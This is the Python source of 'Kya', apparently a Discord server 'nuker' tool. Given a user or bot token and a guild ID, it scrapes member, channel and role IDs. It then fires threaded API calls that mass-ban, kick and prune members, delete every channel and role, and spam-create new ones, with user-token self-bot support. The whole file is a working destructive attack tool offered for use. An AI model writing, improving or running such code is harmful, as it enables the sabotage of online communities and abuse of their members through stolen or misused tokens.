import discord, httpx, os, requests, sys, threading, time
from discord.ext import commands
from random import randint

session = httpx.Client()

randomint = randint(8,9)

banreason = "Kya!XyloW"

# ---- Colors ---- #

g = '\033[90m'
w = '\033[37m'
b = '\033[0;34m'
re = '\033[0m'

# ---- Status Codes ---- #

valid = [200, 201, 204]
rl = [204]

# ---- Token ---- #

os.system("mode 80, 20 & title Kya: Login - Token")

token = input(f"{b}[{w}+{b}]{b}Token: {w}")

def headfilter() -> str:
    if requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token}).status_code in valid:
        return "user"
    elif requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": f"Bot {token}"}).status_code in valid:
        return "bot"
    else:
        print(f"{b}[{w}+{w}]{b}Invalid Token")
        token
        
        
def rr() -> bool:
    if headfilter() == "user":
        return True
    else:
        return False
        
def hea() -> dict:
    if headfilter() == "user":    
        return {"Authorization": token}
    elif headfilter() == "bot":
        return {"Authorization": f"Bot {token}"}
    else:
        print(f"{b}[{w}+{w}]{b}Invalid Token")
        
headers = hea()
        
def clear():
    if sys.platform.startswith("win"):
        os.system("cls")
    else:
        os.system("clear")
        
clear()
        
# ---- Guild ---- #

os.system("mode 80, 20 & title Kya: Login - Guild")

guildid = int(input(f"{b}[{w}+{b}]{b}Guild ID: {w}"))

clear()

# ---- Setup ---- #

client = commands.Bot(command_prefix="Kya!", self_bot=rr())

@client.event
async def on_ready():
    global guildobj
    try:
        guildobj = client.get_guild(guildid)
    except:
        print(f"Bot Not In Guild!")
        clear()
        guildid
    await KyaMenu()
        
class KyaNuker:
        
    def KyaBan(me):
        api = f"https://discord.com/api/v{randomint}/guilds/{guildid}/bans/{me}?reason={banreason}"
        if session.put(api, headers=headers).status_code in valid:
            print(f"{b}[{w}+{w}]{b}Banned {me}{w}")
        elif session.put(api, headers=headers).status_code in rl:
            print(f"{b}[{w}+{w}]{b}Rate Limited!{w}")
        elif session.put(api, headers=headers).status_code not in valid and session.put(api, headers=headers).status_code not in rl:
            print(f"{b}[{w}+{w}]{b}Failed To Ban {me}{w}")
            
    def KyaCreateChannels(name):
        json = {
            "name": name
        }
        api = f"https://discord.com/api/v{randomint}/guilds/{guildid}/channels?reason={banreason}"
        if session.post(api, headers=headers, json=json).status_code in valid:
            print(f"{b}[{w}+{w}]{b}Created Channel: {name}{w}")
        elif session.post(api, headers=headers, json=json).status_code in rl:
            print(f"{b}[{w}+{w}]{b}Rate Limited!{w}")
        elif session.post(api, headers=headers, json=json).status_code not in valid and session.post(api, headers=headers, json=json).status_code not in rl:
            print(f"{b}[{w}+{w}]{b}Couldn't Create Channel: {name}{w}")
            
    async def KyaScrape():
        await client.wait_until_ready()
        
        os.system(f"cls & mode 80, 20 & title Kya - Scraping: {guildid}")
        
        try:
            os.remove("Scraped/Members.txt")
            os.remove("Scraped/Channels.txt")
            os.remove("Scraped/Roles.txt")
        except:
            pass
            
            
        membercount = 0
        with open("Scraped/Members.txt", "a")as mems:
            for mem in guildobj.members:
                mems.write(str(mem.id) + "\n")
                membercount += 1
        
        channelcount = 0
        with open("Scraped/Channels.txt", "a")as chans:
            for channel in guildobj.channels:
                chans.write(str(channel.id) + "\n")
                channelcount += 1
                
        rolecount = 0
        with open("Scraped/Roles.txt", "a")as roles:
            for role in guildobj.roles:
                roles.write(str(role.id) + "\n")
                rolecount += 1
                
        print(f"{b}[{w}+{w}]{b}Scraped {rolecount} Roles\n{b}[{w}+{w}]{b} Scraped {channelcount} Channels\n{b}[{w}+{w}]{b}Scraped{membercount} Members")
        time.sleep(1)
        clear()
        await KyaMenu()
        
    def KyaDelChannels(ch):
        api = f"https://discord.com/api/v{randomint}/channels/{ch}?reason={banreason}"
        if session.delete(api, headers=headers).status_code in valid:
            print(f"{b}[{w}+{w}]{b}Deleted Channel: {ch}{w}")
        elif session.delete(api, headers=headers).status_code in rl:
            print(f"{b}[{w}+{w}]{b}Rate Limited!{w}")
        elif session.delete(api, headers=headers).status_code not in valid and session.delete(api, headers=headers).status_code not in rl:
            print(f"{b}[{w}+{w}]{b}Couldn't Delete Channel: {ch}{w}")
            
    def KyaCreateRoles(name):
        api = f"https://discord.com/api/v9/guilds/{guildid}/roles?reason={banreason}"
        json = {
            "name": name
        }
        if session.post(api, headers=headers, json=json).status_code in valid:
            print(f"{b}[{w}+{w}]{b}Created Role: {name}{w}")
        elif session.post(api, headers=headers, json=json).status_code in rl:
            print(f"{b}[{w}+{w}]{b}Rate Limited!{w}")
        elif session.post(api, headers=headers, json=json).status_code not in valid and session.post(api, headers=headers, json=json).status_code not in rl:
            print(f"{b}[{w}+{w}]{b}Couldn't Create Role: {name}{w}")
            
    def KyaDelRoles(rid):
        api = f"https://discord.com/api/v{randomint}/roles/{rid}?reason={banreason}"
        if session.delete(api, headers=headers).status_code in valid:
            print(f"{b}[{w}+{w}]{b}Deleted Role: {rid}{w}")
        elif session.delete(api, headers=headers).status_code in rl:
            print(f"{b}[{w}+{w}]{b}Rate Limited!{w}")
        elif session.delete(api, headers=headers).status_code not in valid and session.delete(api, headers=headers).status_code not in rl:
            print(f"{b}[{w}+{w}]{b}Couldn't Delete Role: {rid}{w}")
            
    def KyaPrune():
        api = f"https://discord.com/api/v9/guilds/{guildid}/prune?reason={banreason}"
        PruneReq = requests.post(api, headers=headers)
        if PruneReq.status_code in valid:
            print(f"{b}[{w}+{w}]{b} Pruned {PruneReq.json()['pruned']} Members From {guildobj.name}")
        else:
            print(f"{b}[{w}+{w}]{b}Failed To Prune {guildobj.name}")
            
    def KyaKick(mem):
        api = f"https://discord.com/api/v{randomint}/guilds/{guildid}/members/{mem}?reason={banreason}"
        if session.delete(api, headers=headers).status_code in valid:
            print(f"{b}[{w}+{w}]{b}Kicked: {mem}{w}")
        elif session.delete(api, headers=headers).status_code in rl:
            print(f"{b}[{w}+{w}]{b}Rate Limited!{w}")
        elif session.delete(api, headers=headers).status_code not in valid and session.delete(api, headers=headers).status_code not in rl:
            print(f"{b}[{w}+{w}]{b}Couldn't Kick: {mem}{w}")
        
        
          
async def KyaMenu():
    os.system("cls & mode 80, 20 & title Kya - Menu: Waiting")
    print(f"""{b}
                                  
                                | |/ /           
                                | ' /_   _  __ _ 
                                |  <| | | |/ _` |
                                | . \ |_| | (_| |
                                |_|\_\__, |\__,_|
                                    __/ |      
                                    |___/       
                    
                    {w}1 - Ban Members{b}   |   2 - Create Chnls{w}
                    {b}3 - Scrape Guild{w}  |   4 - Del Channels{w}
                    {w}5 -Create Roles{b}   |   6 - Delete Roles{w}
                    {b}7 - Prune Mems{w}    |   8 - Kick Members{w}
        """)
    print("")
    choice = input("> ")
    if choice == "1":
        os.system("cls & mode 80, 20 & title Kya - Banning: Scraped")
        print(f"{b}[{w}+{w}]{b}Banning Members.")
        KyaLoop = True
        members = []
        keep_track = 0
        f = open("Scraped/Members.txt", "r")
        for line in f:
            sl = line.strip()
            members.append(sl)
        f.close()
        while KyaLoop:
            try:
                keep_track += 1
                threading.Thread(target=KyaNuker.KyaBan, args=(members[keep_track],)).start()
            except:
                KyaLoop = False
        if KyaLoop == False:
            for member in members:
                threading.Thread(target=KyaNuker.KyaBan, args=(member,)).start()
                keep_track += 1
        time.sleep(1)
        print(f"{b}[{w}+{w}]{b}Banned {keep_track} Members")
        time.sleep(1)
        clear()
        await KyaMenu()
        
    elif choice == "2":
        os.system("cls & mode 80, 20 & title Kya - Creating: Channels")
        name = input(f"Channel Names: ")
        amount = int(input("Amount: "))
        keep_track = 0
        for i in range(amount):
            threading.Thread(target=KyaNuker.KyaCreateChannels, args=(name,)).start()
            keep_track += 1
        time.sleep(4)
        print(f"{b}[{w}+{w}]{b}Created {keep_track} Channels...")
        time.sleep(1)
        clear()
        await KyaMenu()
        
    elif choice == "3":
        clear()
        await KyaNuker.KyaScrape()
        
    elif choice == "4":
        "cls & mode 80, 20 & title Kya - Deleting: Channels"
        KyaLoop = True
        channels = []
        keep_track = 0
        f = open("Scraped/Channels.txt")
        for line in f:
            stripped = line.strip()
            channels.append(stripped)
        f.close()
        while KyaLoop:
            try:
                keep_track += 1
                threading.Thread(target=KyaNuker.KyaDelChannels, args=(channels[keep_track],)).start()
            except:
                KyaLoop = False
        for chann in channels:
            threading.Thread(target=KyaNuker.KyaDelChannels, args=(chann,)).start()
            keep_track += 1
        time.sleep(3)
        print(f"{b}[{w}+{w}]{b}Deleted {keep_track} Channels!")
        time.sleep(1)
        clear()
        await KyaMenu()
        
    elif choice == "5":
        os.system("cls & mode 80, 20 & title Kya - Creating: Roles")
        name = input("Role Names: ")
        amount = int(input("Role Amount: "))
        keep_track = 0
        for x in range(amount):
            threading.Thread(target=KyaNuker.KyaCreateRoles, args=(name,)).start()
            keep_track += 1
        time.sleep(2)
        print(f"{b}[{w}+{w}]{b} Created {keep_track} Roles..!")
        time.sleep(1)
        clear()
        await KyaMenu()
        
        
    elif choice == "6":
        os.system("cls & mode 80, 20 & title Kya - Deleting: Roles")
        keep_track = 0
        KyaLoop = True
        roles = []
        f = open("Scraped/Roles.txt")
        for line in f:
            ster = line.strip()
            roles.append(ster)
        f.close()
        while KyaLoop:
            try:
                keep_track += 1
                threading.Thread(target=KyaNuker.KyaDelRoles, args=(roles[keep_track],)).start()
            except:
                KyaLoop = False
        if KyaLoop == False:
            for role in roles:
                threading.Thread(target=KyaNuker.KyaDelRoles, args=(role,)).start()
                keep_track += 1
        time.sleep(2)
        print(f"{b}[{w}+{w}]{b} Deleted {keep_track} Roles..!")
        time.sleep(1)
        clear()
        await KyaMenu()
        
    elif choice == "7": 
        os.system(f"cls & mode 80, 20 & title Kya - Pruning: {guildobj.name}")
        KyaNuker.KyaPrune()
        time.sleep(1)
        clear()
        await KyaMenu()
        
    elif choice == "8":
        os.system("cls & mode 80, 20 & title Kya - Kicking: Scraped")
        print(f"{b}[{w}+{w}]{b}Kicking Members.")
        KyaLoop = True
        members = []
        keep_track = 0
        f = open("Scraped/Members.txt", "r")
        for line in f:
            sl = line.strip()
            members.append(sl)
        f.close()
        while KyaLoop:
            try:
                keep_track += 1
                threading.Thread(target=KyaNuker.KyaKick, args=(members[keep_track],)).start()
            except:
                KyaLoop = False
        if KyaLoop == False:
            for member in members:
                threading.Thread(target=KyaNuker.KyaKick, args=(member,)).start()
                keep_track += 1
        time.sleep(1)
        print(f"{b}[{w}+{w}]{b}Kicked {keep_track} Members")
        time.sleep(1)
        clear()
        await KyaMenu()
        
try:
    if headfilter() == "user":
        client.run(token, bot=False)
    elif headfilter() == "bot":
        client.run(token)
except:
    print(f'{b}[{w}!{b}] {w}Invalid Token{b}! {w}')
    time.sleep(1)
    os._exit(0)    
